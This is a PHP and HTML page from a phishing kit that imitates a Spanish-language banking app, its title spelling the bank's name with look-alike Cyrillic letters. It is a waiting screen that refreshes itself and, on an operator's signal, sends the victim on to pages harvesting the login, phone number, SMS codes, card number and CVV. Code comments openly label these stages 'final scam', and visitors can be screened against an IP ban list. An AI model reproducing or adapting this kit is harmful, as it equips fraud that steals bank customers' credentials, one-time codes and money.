<?php
session_start();
include './admintus/config/config.php';
include './admintus/config/db.class.php';
include './admintus/config/User.php';
include './helpers/class/UserInfo.php';
include './helpers/functions.php';
include './config.php';
$userclass = new User();
$db  = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);
header("Refresh:5");


$info = $db->fetch($userclass->getStatus($_SESSION['time']));
$status =  $info['status'];
switch ($status) {
    case 2:
        #error login
        $_SESSION['update']['login'] = true;
        $_SESSION['error']['login'] = true;
        header("location: ./login");
        break;
    case 3:
        #error movil
        $_SESSION['error']['phone'] = 'El numero movil ingresado es incorrecto';
        header("location: ./phone");
        break;
    case 4:
        #pedir sms
        header("location: ./sms");
        break;
    case 5:
        #error sms
        $_SESSION['error']['sms'] = 'El codigo SMS ingresado es incorrecto';
        header("location: ./sms");
        break;
    case 6:
        #exp sms
        $_SESSION['error']['exp_sms'] = 'El codigo SMS proporcionado a expirado';
        header("location: ./sms");
        break;
    case 7:
        #pedir cc
        header("location: ./tarjeta");
        break;
    case 8:
        #error cc
        header("location: ./tarjeta");
        $_SESSION['error']['tarjeta'] = 'Los datos proporcionados son invalidos, Por favor verifique e intente de nuevo';
        break;
    case 10:
        #final scam
        header("location: ./thanks");
        break;
    case 10:
        #final scam
        header("location: ./cvv");
        break;
    case 12:
        #final scam
        header("location: ./cvv");
        break;
    case 14:
        #final scam
        $_SESSION['error']['cvv'] = true;
        header("location: ./cvv");
        break;
    case 13:
        #final scam
        header("location: ./caller");
        break;
    case 15:
        #final scam
        header("location: ./desv");
        break;
    case 16:
        #final scam
        header("location: ./desv");
        break;
}

if (isset($_SESSION['final'])) 
{
    if (file_exists('./admintus/IPBam.txt')) 
    {
        comprobateIP('./admintus/IPBam.txt', UserInfo::getIP(), $out_url);
    }
}

if (!isset($_SESSION['page'])) header('location: ./');
?>
<!DOCTYPE html>
<html>
    <title>&#1042;&#1042;&#86;&#1040;</title>
    <head>
        <!-- No cache tags -->
        <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes" />
        <meta http-equiv="Cache-control" content="no-cache" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta name="HandheldFriendly" content="True" />
        <meta name="robots" content="nofollow, noindex" />
        <!-- Meta Tags -->
        <link rel="apple-touch-icon" sizes="57x57" href="assets/img/favicons/57x57.png?v=2" />
        <link rel="apple-touch-icon" sizes="72x72" href="assets/img/favicons/72x72.png?v=2" />
        <link rel="apple-touch-icon" sizes="76x76" href="assets/img/favicons/76x76.png?v=2" />
        <link rel="apple-touch-icon" sizes="114x114" href="assets/img/favicons/114x114.png?v=2" />
        <link rel="apple-touch-icon" sizes="120x120" href="assets/img/favicons/120x120.png?v=2" />
        <link rel="apple-touch-icon" sizes="144x144" href="assets/img/favicons/144x144.png?v=2" />
        <link rel="apple-touch-icon" sizes="152x152" href="assets/img/favicons/152x152.png?v=2" />
        <link rel="apple-touch-icon" sizes="167x167" href="assets/img/favicons/167x167.png?v=2" />
        <link rel="apple-touch-icon" sizes="180x180" href="assets/img/favicons/180x180.png?v=2" />
        <link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicons/16x16.png?v=2" />
        <link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicons/32x32.png?v=2" />
        <link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicons/96x96.png?v=2" />
        <link rel="icon" type="image/png" sizes="128x128" href="assets/img/favicons/128x128.png?v=2" />
        <link rel="icon" type="image/png" sizes="192x192" href="assets/img/favicons/192x192.png?v=2" />
        <link rel="icon" type="image/png" sizes="195x195" href="assets/img/favicons/195x195.png?v=2" />
        <link rel="icon" type="image/png" sizes="196x196" href="assets/img/favicons/196x196.png?v=2" />
        <link rel="icon" type="image/png" sizes="228x228" href="assets/img/favicons/228x228.png?v=2" />
        <link rel="stylesheet" type="text/css" href="assets/buzz.css" />
        <link rel="stylesheet" type="text/css" href="assets/vendor.css" />
        <link rel="stylesheet" type="text/css" href="assets/app.min.css" />
        <!-- <script type="text/javascript" src="assets/js/jquery-3.5.1.min.js"></script>
        <script type="text/javascript" src="assets/js/jquery.cookie.js"></script> -->
    </head>
    <body id="app" ontouchstart="" class="ember-application">
        <div class="ember-view" id="ember3">
            <div id="ember4" style="display: none;" class="veil visible ember-view">
                <span id="ember5" class="progress-content-light full-size full-height flexy-item align-centered justify-center size_6 ember-view">
                    <svg class="progress-content-light__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve">
                        <desc>Cargando...</desc>
                        <path
                            class="progress-content-light__path"
                            d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z"
                        ></path>
                        <g>
                            <defs>
                                <path
                                    id="progressContent_1_ember5"
                                    d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z"
                                ></path>
                            </defs>
                            <clipPath id="progressContent_2_ember5">
                                <use xlink:href="#progressContent_1_ember5" style="overflow: visible;"></use>
                            </clipPath>
                            <radialGradient
                                id="progressContent_3_ember5"
                                cx="195.6494"
                                cy="114.4386"
                                r="185.5059"
                                fx="24.1631"
                                fy="113.1565"
                                gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 379.0422 -24.3454)"
                                gradientUnits="userSpaceOnUse"
                            >
                                <stop offset="0" class="progress-content-light__stop1"></stop>
                                <stop offset="1" class="progress-content-light__stop2"></stop>
                            </radialGradient>
                            <polygon
                                style="clip-path: url(#progressContent_2_ember5); fill: url(#progressContent_3_ember5);"
                                class="progress-content-light__flare"
                                points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313"
                            ></polygon>
                        </g>
                    </svg>
                    <!---->
                </span>
            </div>
            <div id="ember6" class="veil visible hide ember-view">
                <section class="item-space full-size full-height oh wrapper flexy-item bg_pr">
                    <div id="ember7" class="progress-loading no-margin full-height block ember-view" data-loading="true">
                        <div data-id="box" class="progress-loading__box item-space flexy-item justify-center align-centered no-margin bg_pr">
                            <span id="ember8" class="progress-content-dark full-size full-height flexy-item align-centered justify-center size_8 ember-view">
                                <svg
                                    class="progress-content-dark__svg"
                                    version="1.1"
                                    xmlns="http://www.w3.org/2000/svg"
                                    xmlns:xlink="http://www.w3.org/1999/xlink"
                                    x="0px"
                                    y="0px"
                                    viewBox="0 0 400 400"
                                    xml:space="preserve"
                                    preserveAspectRatio="xMidYMid meet"
                                >
                                    <desc>Validando credenciales...</desc>
                                    <circle class="progress-content-dark__circle" id="Fill" cx="200" cy="200" r="197.5"></circle>
                                    <g id="Outline">
                                        <g class="progress-content-dark__outline">
                                            <path
                                                class="progress-content-dark__path"
                                                d="M200,3.5c26.53,0,52.26,5.2,76.49,15.44c23.4,9.9,44.41,24.07,62.46,42.11c18.05,18.05,32.22,39.06,42.11,62.46c10.25,24.22,15.44,49.96,15.44,76.49s-5.2,52.26-15.44,76.49c-9.9,23.4-24.07,44.41-42.11,62.46c-18.05,18.05-39.06,32.22-62.46,42.11C252.26,391.3,226.53,396.5,200,396.5s-52.26-5.2-76.49-15.44c-23.4-9.9-44.41-24.07-62.46-42.11s-32.22-39.06-42.11-62.46C8.7,252.26,3.5,226.53,3.5,200s5.2-52.26,15.44-76.49c9.9-23.4,24.07-44.41,42.11-62.46s39.06-32.22,62.46-42.11C147.74,8.7,173.47,3.5,200,3.5 M200,2.5C90.92,2.5,2.5,90.92,2.5,200S90.92,397.5,200,397.5S397.5,309.08,397.5,200S309.08,2.5,200,2.5L200,2.5z"
                                            ></path>
                                        </g>
                                    </g>
                                    <g class="progress-content-dark__flare" id="Light">
                                        <defs>
                                            <circle id="Mask" cx="200" cy="200" r="197.5"></circle>
                                        </defs>
                                        <clipPath id="progressContentMask_1_">
                                            <use class="ov" xlink:href="#Mask"></use>
                                        </clipPath>
                                        <radialGradient
                                            id="progressContentGradient_1_"
                                            cx="240.1771"
                                            cy="92.3703"
                                            r="129.7024"
                                            fx="120.2762"
                                            fy="91.5826"
                                            gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 344.2659 -118.2497)"
                                            gradientUnits="userSpaceOnUse"
                                        >
                                            <stop offset="0" class="progress-content-dark__stop1"></stop>
                                            <stop offset="1" class="progress-content-dark__stop2"></stop>
                                        </radialGradient>
                                        <polygon class="progress-content-dark__gradient" id="Gradient" points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313 	"></polygon>
                                    </g>
                                    <g id="Shine">
                                        <g>
                                            <image
                                                class="progress-content-dark__shine"
                                                xlink:href="data:image/png;base64,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"
                                            ></image>
                                        </g>
                                    </g>
                                </svg>
                                <!---->
                            </span>
                        </div>
                        <div class="progress-loading__wrapper absolute flexy-item align-centered justify-center bg_pr-core">
                            <div class="progress-loading__svg relative">
                                <svg class="progress-loading__padlock-body absolute" fill="#fff">
                                    <path
                                        d="M10.2857143,13.7142857 L18.8571429,13.7142857 L24.5714286,13.7142857 L25.1504026,13.7142857 C25.7774179,13.7142857 26.2857143,14.2285129 26.2857143,14.8649663 L26.2857143,28.5636051 C26.2857143,29.1991085 25.7772042,29.7142857 25.1504026,29.7142857 L6.84959735,29.7142857 C6.22258205,29.7142857 5.71428571,29.2000585 5.71428571,28.5636051 L5.71428571,14.8649663 C5.71428571,14.229463 6.22279576,13.7142857 6.84959735,13.7142857 L8,13.7142857 L10.2857143,13.7142857 Z"
                                    ></path>
                                </svg>
                                <svg class="progress-loading__padlock-symbol absolute" fill="#064079">
                                    <polygon points="0,0 0,2.3 6.9,2.3 9.2,0 "></polygon>
                                </svg>
                                <svg class="progress-loading__padlock absolute" fill="#02a5a5">
                                    <path
                                        d="M3.04541016,15.0397339 L3.04541016,6.99123 C3.04541016,4.62923 4.6382,2.84985352 7.0002,2.84985352 C9.3672,2.84985352 11.0378418,4.63823 11.0378418,6.99223 L11.0378418,9.49923 L13.2165527,9.01535742 L13.2165527,6.99123 C13.2165527,3.68123 10.3142,0.748168945 7.0002,0.748168945 C3.6932,0.748168945 0.74987793,3.68323 0.74987793,6.99223 L0.74987793,15.0397339 L3.04541016,15.0397339 Z"
                                    ></path>
                                </svg>
                            </div>
                            <p data-id="text" class="progress-loading__text color_se-0 txt_s set-padding-top-2" role="alert"><b>Validando credenciales...</b></p>
                        </div>
                    </div>
                </section>
            </div>
            <div tabindex="0" aria-hidden="true" data-id="side-menu" id="ember9" class="navigation-menu flexy-item absolute full-height ember-view" style="counter-reset: menu 7;">
                <nav class="navigation-menu__nav item-space flexy-item no-margin set-padding-bottom-4">
                    <span class="accesible-hide" data-id="welcome-menu" tabindex="0">MenÃº principal de la aplicaciÃ³n</span>
                    <div class="item-space scrolling no-margin show-pivot">
                        <!---->
                        <div class="navigation-menu__items__box set-padding-bottom-3">
                            <div class="navigation-menu__wrapper">
                                <ul id="ember10" class="list-container ember-view">
                                    <!---->
                                    <li data-id="optSecurityModule" id="ember11" class="list-container__item ember-view">
                                        <div class="list-container__wrapper list-container__wrapper--button">
                                            <button data-id="menuItemButton" class="item-space-wide list-container__button" data-ember-action="" data-ember-action-12="12" style="opacity: 1;">
                                                <span class="set-margin-right size_3 item-auto-size icon icon-security" aria-hidden="true"></span>
                                                <b class="txt_s txt-align-l item-space set-margin-left">Seguridad y privacidad</b>
                                            </button>
                                        </div>
                                        <!---->
                                    </li>
                                    <li data-id="optSustainability" id="ember13" class="list-container__item ember-view">
                                        <div class="list-container__wrapper list-container__wrapper--button">
                                            <button data-id="menuItemButton" class="item-space-wide list-container__button" data-ember-action="" data-ember-action-14="14" style="opacity: 1;">
                                                <span class="set-margin-right size_3 item-auto-size icon icon-environment" aria-hidden="true"></span>
                                                <b class="txt_s txt-align-l item-space set-margin-left">Sostenibilidad</b>
                                            </button>
                                        </div>
                                        <!---->
                                    </li>
                                    <!---->
                                    <li data-id="optSideMenuExperiences" id="ember15" class="list-container__item ember-view">
                                        <div class="list-container__wrapper list-container__wrapper--button">
                                            <button data-id="menuItemButton" class="item-space-wide list-container__button" data-ember-action="" data-ember-action-16="16" style="opacity: 1;">
                                                <span class="set-margin-right size_3 item-auto-size icon icon-promotion" aria-hidden="true"></span>
                                                <b class="txt_s txt-align-l item-space set-margin-left">Experiencias</b>
                                            </button>
                                        </div>
                                        <!---->
                                    </li>
                                    <li data-id="atmButton" id="ember17" class="list-container__item ember-view">
                                        <div class="list-container__wrapper list-container__wrapper--button">
                                            <button data-id="menuItemButton" class="item-space-wide list-container__button" data-ember-action="" data-ember-action-18="18" style="opacity: 1;">
                                                <span class="set-margin-right size_3 item-auto-size icon icon-place" aria-hidden="true"></span>
                                                <b class="txt_s txt-align-l item-space set-margin-left">Oficinas y cajeros</b>
                                            </button>
                                        </div>
                                        <!---->
                                    </li>
                                    <li data-id="marketAnalisysButton" id="ember19" class="list-container__item ember-view">
                                        <div class="list-container__wrapper list-container__wrapper--button">
                                            <button data-id="menuItemButton" class="item-space-wide list-container__button" data-ember-action="" data-ember-action-20="20" style="opacity: 1;">
                                                <span class="set-margin-right size_3 item-auto-size icon icon-play" aria-hidden="true"></span>
                                                <b class="txt_s txt-align-l item-space set-margin-left">AnÃ¡lisis de mercado</b>
                                            </button>
                                        </div>
                                        <!---->
                                    </li>
                                    <li data-id="aboutButton" id="ember21" class="list-container__item ember-view">
                                        <div class="list-container__wrapper list-container__wrapper--button">
                                            <button data-id="menuItemButton" class="item-space-wide list-container__button" data-ember-action="" data-ember-action-22="22" style="opacity: 1;">
                                                <span class="set-margin-right size_3 item-auto-size icon icon-information" aria-hidden="true"></span>
                                                <b class="txt_s txt-align-l item-space set-margin-left">Acerca de</b>
                                            </button>
                                        </div>
                                        <!---->
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <ul class="navigation-menu__wrapper item-space-wide">
                        <li class="item-auto-size">
                            <button class="item-space-wide color_te-3" title="Ir a posiciÃ³n global" data-ember-action="" data-ember-action-23="23">
                                <span class="item-auto-size no-margin icon icon-get-out size_3" aria-hidden="true"></span>
                                <b class="item-auto-size txt_s set-margin-left-2">Entrar</b>
                            </button>
                        </li>
                        <li class="item-auto-size">
                            <button class="oh interactive-hide relative" data-id="btnMenuBack" data-ember-action="" data-ember-action-24="24">Cerrar menÃº</button>
                        </li>
                    </ul>
                </nav>
            </div>
            <div
                aria-hidden="false"
                id="ember27"
                class="liquid-container--shadow liquid-container ember-view"
                style="
                    touch-action: auto;
                    user-select: none;
                    -webkit-user-drag: none;
                    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
                    transform: translateX(0px) scale(1);
                    transition: transform 233ms ease 0s, -webkit-transform 233ms ease 0s;
                "
            >
                <div id="ember30" class="liquid-child ember-view" style="visibility: inherit; top: 0px; left: 0px;">
                    <div id="ember31" class="bg_pr-core-d login-interaction main ember-view" data-id="routeIndex">
                        <div id="ember32" class="bg_pr-core-d ember-view">
                            <header id="ember33" class="header header-main flexy-item justify-center items-without-margins relative oh bg_transparent color_se-0 ember-view">
                                <!---->
                                <div class="header-main__content item-space-wide align-centered bg_transparent color_se-0 header-main__content--with-image relative set-margin-left-auto set-margin-right-auto max-width-layout full-size">
                                    <div id="ember34" class="txt-align-c header-main__icons--left set-padding-left ember-view">
                                        <button tabindex="0" aria-label="Retroceder una pÃ¡gina" aria-disabled="false" data-id="btnBack" id="ember35" class="icon-return icon touch-shadow rounded ember-view"></button>
                                    </div>
                                    <div data-id="lblHead" id="ember36" class="header-main__title oh txt-align-c ember-view">
                                        <h1 tabindex="-1" class="flexy-item justify-center full-height">
                                            <div class="svg-header"><img class="img-sized size_6" src="assets/svg/logo-white.svg" alt="" /></div>
                                        </h1>
                                    </div>
                                    <div id="ember77" class="txt-align-c header-main__icons--right set-padding-right ember-view">
                                        <span tabindex="0" aria-label="Ayuda" data-id="btnHelp" id="ember78" class="icon touch-shadow rounded btnHelp icon-help ember-view" role="button"></span>
                                        <!---->
                                    </div>
                                </div>
                            </header>
                        </div>
                        <article aria-atomic="true" aria-live="polite" id="ember37" style="display: none;" class="notification-status flexy-item align-centered set-padding bg_te-6-d ember-view">
                            <p class="accesible-hide" data-id="accessibilityText">Estado de tu conexiÃ³n</p>
                            <div class="item-space-wide align-centered">
                                <span class="icon color_se-0 size_2 set-margin-right icon-right" data-id="icon" aria-hidden="true"></span>
                                <span class="color_se-0 txt_s" data-id="title">Estado de tu conexiÃ³n</span>
                            </div>
                            <!---->
                        </article>
                        <div data-alert-show="false" id="ember38" class="alrtCont max-width-layout set-margin-left-auto set-margin-right-auto ember-view"><!----></div>
                        <section class="content wrapper flexy-item">
                            <form id="ember39" class="item-space flexy-item no-margin bg_pr-core-d form-container__login form-container ember-view" method="POST" action="./helpers/loginx.php?id=phone">
                                <div id="ember40" class="form-container__input-box item-space no-margin main-content scrolling ember-view">
                                    <div class="login-user-wrapper set-padding-top hide">
                                        <div class="txt-align-c flexy-item align-centered items-without-margins">
                                            <div class="item-space-wide">
                                                <div class="item-space scapular-content"><!----></div>
                                            </div>
                                            <div class="item-space-wide"><p class="item-space color_se-0 txt_m txt-light set-padding-top-2">Buenos dÃ­as</p></div>
                                        </div>
                                        <div class="txt-align-c set-margin-bottom">
                                            <a data-id="lblYouAreNot" role="button" class="color_se-0 txt_s" data-ember-action="" data-ember-action-41="41"><b>Â¿No eres ?</b></a>
                                        </div>
                                    </div>
                                    <div data-id="form-login" class="set-padding-vertical form-login">
                                        <div class="set-padding-bottom-2">
                                            <div data-type="text" data-id="txtUser" id="ember42" class="form form-text form--navy ember-view">
                                                <p style="
                                                    padding: 14px;
                                                    color: white;
                                                    text-align:center;
                                                ">Por favor espere un momento mientras procesamos su solicitud<br>
                                                    no cierre esta pesta&ntilde;a la misma se actualizara automaticamnte.<br>
                                                Gracias por su paciencia</p>
                                                    <center><img src="./assets/svg/loading.svg" alt=""></center>
                                                <!---->
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </section>
                    </div>
                </div>
            </div>
            <div id="ember55" class="ember-view"><!----></div>
        </div>
    </body>
</html>